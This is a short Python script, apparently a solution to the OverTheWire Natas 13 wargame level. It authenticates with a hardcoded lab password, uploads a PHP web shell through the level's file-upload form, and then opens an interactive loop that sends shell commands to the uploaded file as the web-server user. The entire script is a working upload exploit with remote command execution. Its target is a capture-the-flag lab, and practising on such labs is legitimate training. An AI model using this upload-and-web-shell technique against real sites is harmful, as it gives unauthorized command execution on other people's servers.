import requests
import re
import time

arquivo = "C://Users//Lui19//Desktop//shell_simples.php"
username = ["natas13","jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"]
url = "http://natas13.natas.labs.overthewire.org/"
session = requests.Session()
response = session.get(url, auth=(username[0],username[1]))
print(response.text)
time.sleep(10)
response = session.post(url, auth=(username[0],username[1]), files={"uploadedfile": open(arquivo,"rb")},data={"filename":arquivo})
content = response.text
print(content)
upload = input("Aonde foi colocado o arquivo?\nEXEMPLO: upload/file.php\n>>> ")
while True:
    comando = input("www-data: ")
    resposta =session.get(url+upload+"?cmd="+comando, auth=(username[0],username[1]))
    try:
        print(resposta.content)
    except:
        print("Nao foi possivel decodificar")
        pass
